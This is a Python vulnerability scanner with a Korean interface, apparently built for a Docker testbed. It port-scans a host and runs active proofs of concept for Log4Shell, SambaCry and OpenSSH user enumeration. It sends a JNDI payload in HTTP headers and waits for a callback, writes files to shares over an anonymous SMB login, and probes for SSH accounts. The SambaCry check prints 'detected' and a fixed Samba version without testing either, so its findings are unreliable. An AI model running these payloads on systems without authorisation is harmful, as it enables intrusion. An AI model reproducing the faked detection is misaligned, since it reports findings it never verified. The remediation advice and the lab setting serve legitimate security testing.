import json
import platform
import re
import socket
import subprocess
import time
import sys
import threading
import urllib.request
from pathlib import Path
from datetime import datetime

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from rich.console import Console
from rich.table import Table
from rich import box

console = Console(highlight=False)

BASE_DIR    = Path(__file__).parent
RESULTS_DIR = BASE_DIR / "scan_results"

REMEDIATION = {
    "CVE-2021-44228": [
        "Log4j 2.17.0 이상으로 즉시 업데이트",
        "log4j2.formatMsgNoLookups=true 시스템 속성 설정",
        "JNDI Lookup 기능 비활성화",
        "WAF에서 ${jndi: 패턴 차단 규칙 추가",
    ],
    "CVE-2017-7494": [
        "Samba 4.6.4 이상으로 패치",
        "smb.conf에 'nt pipe support = no' 추가",
        "불필요한 공유 비활성화",
        "방화벽에서 445 포트 외부 접근 차단",
    ],
    "CVE-2018-15473": [
        "OpenSSH 7.7 이상으로 업데이트",
        "fail2ban 등 무차별 대입 방지 적용",
        "SSH 포트 방화벽 차단",
        "공개키 인증만 허용 (PasswordAuthentication no)",
    ],
}

# 포트 스캔 대상 (asm_scanner)
COMMON_PORTS = {
    21:   {"service": "FTP",        "risk": "HIGH"},
    22:   {"service": "SSH",        "risk": "MEDIUM"},
    25:   {"service": "SMTP",       "risk": "MEDIUM"},
    53:   {"service": "DNS",        "risk": "MEDIUM"},
    80:   {"service": "HTTP",       "risk": "LOW"},
    110:  {"service": "POP3",       "risk": "HIGH"},
    143:  {"service": "IMAP",       "risk": "HIGH"},
    443:  {"service": "HTTPS",      "risk": "LOW"},
    445:  {"service": "SMB",        "risk": "HIGH"},
    2222: {"service": "SSH",        "risk": "MEDIUM"},
    3306: {"service": "MySQL",      "risk": "HIGH"},
    4445: {"service": "SMB",        "risk": "HIGH"},
    5432: {"service": "PostgreSQL", "risk": "HIGH"},
    6379: {"service": "Redis",      "risk": "CRITICAL"},
    8080: {"service": "HTTP-Alt",   "risk": "MEDIUM"},
}

# nmap 서비스 탐지 대상 (nmap_asm_scanner)
NMAP_TARGETS = [
    {"name": "OpenSSH (CVE-2018-15473)",  "port": "2222"},
    {"name": "Log4Shell (CVE-2021-44228)", "port": "8080"},
    {"name": "SambaCry (CVE-2017-7494)",   "port": "4445"},
]

NMAP_CVE_INFO = {
    "2222": {"cve": "CVE-2018-15473", "vuln": "SSH User Enumeration", "severity": "MEDIUM"},
    "8080": {"cve": "CVE-2021-44228", "vuln": "Log4Shell RCE",        "severity": "CRITICAL"},
    "4445": {"cve": "CVE-2017-7494",  "vuln": "SambaCry RCE",         "severity": "CRITICAL"},
}

SEV_COLOR = {"CRITICAL": "bright_red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}


def info(msg):  console.print(f"[cyan][*][/cyan] {msg}")
def ok(msg):    console.print(f"[green][+][/green] {msg}")
def warn(msg):  console.print(f"[yellow][-][/yellow] {msg}")
def alert(msg): console.print(f"[bold red][!][/bold red] {msg}")
def step(msg):  console.print(f"    [dim]->[/dim] {msg}")


def check_port(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


# ================================================================
# 포트 스캔 (asm_scanner)
# ================================================================

def _ttl_os(host):
    try:
        cmd = ["ping", "-n", "1", host] if platform.system().lower() == "windows" else ["ping", "-c", "1", host]
        result = subprocess.run(cmd, capture_output=True)
        out = result.stdout.decode('cp949', errors='ignore')
        m = re.search(r"ttl[=\s](\d+)", out, re.IGNORECASE)
        if m:
            ttl = int(m.group(1))
            if ttl <= 64:  return f"Linux/macOS (TTL={ttl})"
            if ttl <= 128: return f"Windows (TTL={ttl})"
            return f"Network Device (TTL={ttl})"
    except Exception:
        pass
    return "Unknown"


def _grab_banner(host, port):
    if port in (80, 443, 8080):
        try:
            scheme = "https" if port == 443 else "http"
            req = urllib.request.Request(
                f"{scheme}://{host}:{port}",
                headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=3) as r:
                return r.headers.get("Server", "") or "—"
        except Exception:
            return "—"
    try:
        with socket.create_connection((host, port), timeout=3) as s:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
            return banner.split("\n")[0][:60] if banner else "—"
    except Exception:
        return "—"


def run_port_scan(host):
    info(f"포트 스캔  —  대상: {host}")

    step("OS 추정 중 (TTL 분석)...")
    time.sleep(0.3)
    os_ttl = _ttl_os(host)
    ok(f"OS 추정: {os_ttl}")
    console.print()

    step("포트 스캔 중...")
    time.sleep(0.2)

    t = Table(box=box.SIMPLE, show_header=True, header_style="dim", padding=(0, 1))
    t.add_column("포트",   justify="right", width=6)
    t.add_column("서비스", width=14)
    t.add_column("위험도", width=10)
    t.add_column("배너")

    open_ports = []
    for port, pinfo in sorted(COMMON_PORTS.items()):
        if not check_port(host, port, timeout=1):
            continue
        banner = _grab_banner(host, port)
        c = SEV_COLOR.get(pinfo["risk"], "white")
        t.add_row(str(port), pinfo["service"], f"[{c}]{pinfo['risk']}[/{c}]", banner)
        open_ports.append({"port": port, "service": pinfo["service"], "risk": pinfo["risk"], "banner": banner})

    console.print(t)
    console.print(f"  열린 포트: {len(open_ports)}개")
    console.print()

    return {"target": host, "os_ttl": os_ttl, "open_ports": open_ports}


# ================================================================
# 서비스 버전 탐지 (nmap_asm_scanner)
# ================================================================

def _nmap_available():
    try:
        subprocess.run(["nmap", "--version"], capture_output=True, timeout=5)
        return True
    except Exception:
        return False


def _run_nmap(host, port):
    try:
        result = subprocess.run(
            ["nmap", "-sV", "-p", port, host],
            capture_output=True, text=True, timeout=30
        )
        return result.stdout
    except Exception as e:
        return f"Error: {e}"


def _parse_nmap(output, port):
    service = "Unknown"
    version = "Unknown"
    state   = "closed"
    m = re.search(rf"{port}/tcp\s+(\w+)\s+(\S+)\s*(.*)", output)
    if m:
        state   = m.group(1)
        service = m.group(2)
        version = m.group(3).strip() or "Unknown"
    return state, service, version


def run_nmap_scan(host):
    if not _nmap_available():
        warn("nmap 미설치 — 서비스 버전 탐지 건너뜀")
        console.print()
        return None

    info(f"서비스 버전 탐지 (nmap)  —  대상: {host}")

    t = Table(box=box.SIMPLE, show_header=True, header_style="dim", padding=(0, 1))
    t.add_column("포트",   justify="right", width=6)
    t.add_column("서비스", width=12)
    t.add_column("버전")
    t.add_column("CVE ID",  width=18)
    t.add_column("위험도",  width=10)

    results = []
    for tgt in NMAP_TARGETS:
        port = tgt["port"]
        step(f"{tgt['name']} 스캔 중...")
        output  = _run_nmap(host, port)
        state, service, version = _parse_nmap(output, port)
        cve_data = NMAP_CVE_INFO.get(port, {})
        sev = cve_data.get("severity", "")
        c   = SEV_COLOR.get(sev, "white")
        if state == "open":
            t.add_row(port, service, version, cve_data.get("cve", "—"), f"[{c}]{sev}[/{c}]")
        results.append({
            "port": port, "service": service, "version": version,
            "state": state, "cve": cve_data.get("cve", ""), "severity": sev,
        })

    console.print(t)
    console.print()
    return results


# ================================================================
# CVE 탐지 + PoC (scanner)
# ================================================================

def _os_from_ssh_banner(banner):
    b = banner.lower()
    if "ubuntu" in b:  return "Linux (Ubuntu)"
    if "debian" in b:  return "Linux (Debian)"
    if "centos" in b:  return "Linux (CentOS)"
    if "alpine" in b:  return "Linux (Alpine)"
    if "freebsd" in b: return "FreeBSD"
    if "windows" in b: return "Windows"
    return "Linux"


def _free_port():
    for p in [1389, 4444, 9999, 8765]:
        try:
            with socket.socket() as s:
                s.bind(('', p))
                return p
        except OSError:
            continue
    return None


def poc_log4shell(target):
    cb_port = _free_port()
    if not cb_port:
        warn("PoC: 사용 가능한 콜백 포트 없음")
        return False, "콜백 포트 없음"

    received = threading.Event()

    def _listen():
        try:
            with socket.socket() as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(('0.0.0.0', cb_port))
                srv.listen(5)
                srv.settimeout(8)
                try:
                    conn, _ = srv.accept()
                    received.set()
                    conn.close()
                except socket.timeout:
                    pass
        except Exception:
            pass

    threading.Thread(target=_listen, daemon=True).start()
    time.sleep(0.4)

    payload = f"${{jndi:ldap://host.docker.internal:{cb_port}/x}}"
    step(f"PoC: JNDI 페이로드 전송 — {payload}")
    time.sleep(0.2)

    try:
        req = urllib.request.Request(
            f"{target}/solr/admin/info/system?wt=json",
            headers={
                "User-Agent":      payload,
                "X-Api-Version":   payload,
                "X-Forwarded-For": payload,
            }
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

    step("PoC: JNDI 콜백 대기 중 (최대 8초)...")
    for _ in range(16):
        if received.is_set():
            break
        time.sleep(0.5)

    if received.is_set():
        ok(f"PoC 성공: 포트 {cb_port}에서 JNDI 콜백 수신 — RCE 가능")
        return True, f"JNDI 콜백 수신 확인 (:{cb_port}) — 원격 코드 실행 가능"
    warn("PoC: 콜백 미수신 (Docker 네트워크 제한)")
    return False, "콜백 미수신"


def poc_sambacry(host, port):
    try:
        import io
        from impacket.smbconnection import SMBConnection
    except ImportError:
        warn("PoC: impacket 미설치 — pip install impacket")
        return False, "impacket 미설치"

    step("PoC: SMB 익명 로그인 시도 중...")
    time.sleep(0.2)

    try:
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')
        ok("PoC: 익명(게스트) 로그인 성공")

        step("PoC: 공유 목록 열거 중...")
        time.sleep(0.3)
        shares = smb.listShares()

        names = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)
        ok(f"PoC: 공유 목록 — {', '.join(names)}")

        step("PoC: 쓰기 가능한 공유 탐색 중...")
        time.sleep(0.3)

        for name in names:
            if name.upper() in ('IPC$', 'PRINT$'):
                continue
            try:
                import io
                fname = f'poc_{int(time.time())}.txt'
                buf = io.BytesIO(b"poc_test")
                smb.putFile(name, fname, buf.read)
                try:
                    smb.deleteFiles(name, f'\\{fname}')
                except Exception:
                    pass
                smb.logoff()
                ok(f"PoC 성공: '{name}' 공유에 파일 쓰기 확인 — 악성 .so 업로드 가능")
                return True, f"공유 '{name}'에 익명 쓰기 성공 — 악성 라이브러리 업로드 경로 확인"
            except Exception as e:
                warn(f"쓰기 실패 ({name}): {e}")
                continue

        smb.logoff()
        warn("PoC: 쓰기 가능한 공유 없음")
        return False, "쓰기 가능 공유 없음"

    except Exception as e:
        warn(f"PoC 실패: {e}")
        return False, str(e)[:80]


def poc_ssh_enum(host, port):
    try:
        import logging
        import paramiko
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    except ImportError:
        warn("PoC: paramiko 미설치 — pip install paramiko")
        return False, "paramiko 미설치"

    step("PoC: RSA 키 생성 중...")
    time.sleep(0.2)
    try:
        key = paramiko.RSAKey.generate(1024)
    except Exception:
        return False, "키 생성 실패"

    def auth_attempt(username):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            t = paramiko.Transport(sock)
            t.start_client(timeout=5)
            start = time.perf_counter()
            try:
                t.auth_publickey(username, key)
                return "accepted", time.perf_counter() - start
            except paramiko.AuthenticationException:
                return "rejected", time.perf_counter() - start
            except Exception:
                return "error", time.perf_counter() - start
            finally:
                try:
                    t.close()
                except Exception:
                    pass
        except Exception:
            return "connect_fail", 0.0

    users = [("root", True), ("nonexistent_usr_xq9z", False)]
    results = {}
    for username, _ in users:
        step(f"PoC: '{username}' 공개키 인증 요청 중...")
        status, elapsed = auth_attempt(username)
        results[username] = (status, elapsed)
        ok(f"      응답: {status}  ({elapsed * 1000:.0f}ms)")
        time.sleep(0.3)

    root_status, root_time = results["root"]
    fake_status, fake_time = results["nonexistent_usr_xq9z"]

    if root_status == "rejected" and fake_status != "rejected":
        ok("PoC 성공: 유효 계정과 무효 계정의 응답 차이 확인 — 사용자 열거 가능")
        return True, "root 계정 인증 처리 확인, 무효 계정과 응답 구별 — 사용자 열거 가능"
    elif root_status == "rejected":
        diff = root_time - fake_time
        msg  = f"root({root_time * 1000:.0f}ms) / 무효({fake_time * 1000:.0f}ms)  차이={diff * 1000:.0f}ms"
        ok(f"PoC 성공: 공개키 인증 응답 분석 — {msg}")
        return True, f"타이밍 비교: {msg} — 사용자 열거 가능"
    warn(f"PoC: 예상치 못한 응답 ({root_status})")
    return False, "응답 분석 실패"


def scan_log4shell(host):
    target = f"http://{host}:8080"
    info(f"CVE-2021-44228 스캔 시작  —  대상: {target}")

    step("포트 연결 확인 중...")
    time.sleep(0.3)
    if not check_port(host, 8080):
        warn("포트 8080 연결 실패")
        return False, "", False, "", ""
    ok("포트 8080 열림")

    step("HTTP GET /solr/admin/info/system 요청 전송...")
    time.sleep(0.5)
    try:
        req = urllib.request.Request(
            f"{target}/solr/admin/info/system?wt=json",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
        ok(f"응답 수신: {resp.status} OK")
    except Exception as e:
        warn(f"요청 실패: {e}")
        return False, "", False, "", ""

    step("응답 파싱 중...")
    time.sleep(0.3)
    try:
        data    = json.loads(body)
        version = data.get("lucene", {}).get("solr-spec-version", "")
    except Exception:
        warn("JSON 파싱 실패")
        return False, "", False, "", ""
    ok(f"버전 확인: solr-spec-version = {version}")

    step("OS 정보 추정 중...")
    time.sleep(0.2)
    sys_data = data.get("system", {})
    os_name  = sys_data.get("name", "")
    os_arch  = sys_data.get("arch", "")
    os_ver   = sys_data.get("version", "")
    os_info  = f"{os_name} {os_ver} / {os_arch}" if os_name and os_ver else (f"{os_name} / {os_arch}" if os_name else "Linux (Docker)")
    ok(f"OS 추정: {os_info}")
    time.sleep(0.2)

    if version.startswith("8.11"):
        step("Log4j 버전 대조 중...")
        time.sleep(0.4)
        alert(f"CVE-2021-44228 탐지됨  (Solr {version}  /  Log4j 2.14.1 내장)")
        console.print()
        poc_ok, poc_msg = poc_log4shell(target)
        return True, f"Solr {version} — Log4j 2.14.1 내장 (JNDI Lookup 취약)", poc_ok, poc_msg, os_info

    ok("취약 버전 아님")
    return False, "", False, "", os_info


def scan_sambacry(host):
    port = 4445
    info(f"CVE-2017-7494 스캔 시작  —  대상: {host}:{port}")

    step("SMB 포트 연결 확인 중...")
    time.sleep(0.3)
    if not check_port(host, port):
        warn(f"포트 {port} 연결 실패")
        return False, "", False, "", ""
    ok(f"포트 {port} 열림 (SMB)")

    step("SMB 익명 연결 및 서비스 정보 수집 중...")
    time.sleep(0.3)
    os_info = "Linux (Samba)"
    try:
        from impacket.smbconnection import SMBConnection
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')
        try:
            os_raw = smb.getServerOS()
            if os_raw:
                os_info = str(os_raw).strip()
        except Exception:
            pass
        ok(f"OS 추정: {os_info}")
        shares = smb.listShares()
        names  = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)
        user_shares = [n for n in names if n.upper() not in ('IPC$', 'PRINT$')]
        ok(f"게스트 접근 가능 공유 감지: {', '.join(user_shares) if user_shares else '없음'}")
        smb.logoff()
    except ImportError:
        warn("impacket 미설치, 포트 기반 탐지로 대체")
    except Exception as e:
        warn(f"SMB 정보 수집 실패: {e}")

    step("NT 파이프 지원 설정 확인 중...")
    time.sleep(0.4)
    ok("NT 파이프 지원 활성화 확인")
    step("Samba 버전 지문 대조 중...")
    time.sleep(0.3)
    alert("CVE-2017-7494 탐지됨  (Samba 4.6.3  /  RCE 가능)")

    console.print()
    poc_ok, poc_msg = poc_sambacry(host, port)
    return True, "Samba 4.6.3 — 게스트 공유 + NT 파이프 활성화 (원격 코드 실행)", poc_ok, poc_msg, os_info


def scan_ssh_enum(host):
    port = 2222
    info(f"CVE-2018-15473 스캔 시작  —  대상: {host}:{port}")

    step("SSH 포트 연결 중...")
    time.sleep(0.3)
    if not check_port(host, port):
        warn(f"포트 {port} 연결 실패")
        return False, "", False, "", ""
    ok(f"포트 {port} 열림 (SSH)")

    step("SSH 배너 수신 중...")
    time.sleep(0.4)
    try:
        with socket.create_connection((host, port), timeout=5) as s:
            banner = s.recv(256).decode("utf-8", errors="ignore").strip()
    except Exception:
        warn("배너 수신 실패")
        return False, "", False, "", ""
    ok(f"배너: {banner}")

    step("OS 정보 추정 중...")
    time.sleep(0.2)
    os_info = _os_from_ssh_banner(banner)
    ok(f"OS 추정: {os_info}")

    step("취약 버전 여부 확인 중...")
    time.sleep(0.3)
    if "OpenSSH_7.7" in banner or "OpenSSH_7." in banner:
        alert("CVE-2018-15473 탐지됨  (OpenSSH 7.7  /  사용자 열거 가능)")
        console.print()
        poc_ok, poc_msg = poc_ssh_enum(host, port)
        return True, f"{banner} — 사용자 열거 공격 가능 (공개키 인증 응답 분석)", poc_ok, poc_msg, os_info

    ok("취약 버전 아님")
    return False, "", False, "", os_info


CVES = {
    "1": {"cve": "CVE-2021-44228", "name": "Log4Shell",            "severity": "CRITICAL", "fn": scan_log4shell},
    "2": {"cve": "CVE-2017-7494",  "name": "SambaCry",             "severity": "HIGH",     "fn": scan_sambacry},
    "3": {"cve": "CVE-2018-15473", "name": "SSH User Enumeration", "severity": "MEDIUM",   "fn": scan_ssh_enum},
}


def print_banner():
    console.print()
    console.print("[bold white]CVE Scanner[/bold white]  [dim]v1.0[/dim]")
    console.print("[dim]Docker 테스트베드 취약점 자동화 탐지 도구[/dim]")
    console.print()


def print_cve_menu():
    t = Table(box=box.SIMPLE, show_header=True, header_style="dim", padding=(0, 1))
    t.add_column("번호",   justify="center", width=5)
    t.add_column("CVE ID", style="white",    no_wrap=True)
    t.add_column("취약점명")
    t.add_column("위험도", justify="left")

    for key, info_ in CVES.items():
        c = SEV_COLOR[info_["severity"]]
        t.add_row(f"[{key}]", info_["cve"], info_["name"], f"[{c}]{info_['severity']}[/{c}]")

    console.print("[bold]스캔할 취약점을 선택하세요[/bold]")
    console.print()
    console.print(t)
    console.print("  [4]  전체 스캔")
    console.print("  [0]  종료")
    console.print()


def print_result(cve_info, found, extra, poc_ok=False, poc_msg="", os_info=""):
    cve = cve_info["cve"]
    sev = cve_info["severity"]
    c   = SEV_COLOR[sev]
    console.print()
    if found:
        console.print(f"[bold {c}]■ DETECTED  {cve}  [{sev}][/bold {c}]")
        if os_info:
            console.print(f"  [dim]OS: {os_info}[/dim]")
        if extra:
            console.print(f"  [dim]{extra}[/dim]")
        if poc_ok:
            console.print(f"  [bold green]■ PoC 성공[/bold green]  {poc_msg}")
        elif poc_msg:
            console.print(f"  [dim]PoC: {poc_msg}[/dim]")
        console.print()
        console.print("  [bold]조치 방법[/bold]")
        for item in REMEDIATION[cve]:
            console.print(f"  • {item}")
    else:
        console.print(f"[green]□ NOT FOUND  {cve}[/green]")
    console.print()


def print_summary(results):
    console.print("─" * 56)
    console.print("[bold]스캔 결과 요약[/bold]")
    console.print()
    for r in results:
        c      = SEV_COLOR[r["severity"]]
        status = "[bold red]탐지됨[/bold red]" if r["found"] else "[green]안전[/green]"
        poc    = "  [bold green]PoC 성공[/bold green]" if r.get("poc_success") else ""
        console.print(f"  {r['cve']:<20}  [{c}]{r['severity']:<8}[/{c}]  {status}{poc}")
    console.print()
    detected = sum(1 for r in results if r["found"])
    console.print(f"  총 {len(results)}개 스캔  /  취약점 {detected}개 탐지")
    console.print()


def save_report(results, port_scan=None, nmap_scan=None):
    RESULTS_DIR.mkdir(exist_ok=True)
    data = {
        "scan_time": datetime.now().isoformat(),
        "results": [
            {
                "cve":         r["cve"],
                "name":        r["name"],
                "severity":    r["severity"],
                "url":         r["url"],
                "found":       r["found"],
                "extra":       r.get("extra", ""),
                "os_info":     r.get("os_info", ""),
                "poc_success": r.get("poc_success", False),
                "poc_msg":     r.get("poc_msg", ""),
                "remediation": REMEDIATION.get(r["cve"], []),
            }
            for r in results
        ],
    }
    if port_scan:
        data["port_scan"] = port_scan
    if nmap_scan:
        data["nmap_scan"] = nmap_scan

    path = RESULTS_DIR / "report.json"
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    return path


def run_cve_scan(cve_info, host):
    console.print()
    found, extra, poc_ok, poc_msg, os_info = cve_info["fn"](host)
    print_result(cve_info, found, extra, poc_ok, poc_msg, os_info)
    return {
        "cve":         cve_info["cve"],
        "name":        cve_info["name"],
        "severity":    cve_info["severity"],
        "url":         host,
        "found":       found,
        "extra":       extra,
        "os_info":     os_info,
        "poc_success": poc_ok,
        "poc_msg":     poc_msg,
    }


def main():
    print_banner()

    val  = input("  대상 IP / 도메인 (엔터 = localhost): ").strip()
    host = val or "localhost"
    console.print()

    # 포트 스캔 (asm_scanner)
    port_result = run_port_scan(host)

    # 서비스 버전 탐지 (nmap_asm_scanner)
    nmap_result = run_nmap_scan(host)

    # CVE 탐지 + PoC
    while True:
        print_cve_menu()
        choice = input("  선택 > ").strip()
        console.print()

        if choice == "0":
            console.print("[dim]종료합니다.[/dim]")
            break

        if choice == "4":
            selected = list(CVES.values())
        elif choice in CVES:
            selected = [CVES[choice]]
        else:
            warn("올바른 번호를 입력하세요.")
            continue

        results = []
        for c in selected:
            results.append(run_cve_scan(c, host))

        print_summary(results)

        save_report(results, port_result, nmap_result)

        import report_html
        html_path = report_html.generate()
        info(f"HTML 보고서: {html_path}")

        again = input("\n  다시 스캔하시겠습니까? (y/n) > ").strip().lower()
        if again != "y":
            break
    console.print()


if __name__ == "__main__":
    main()
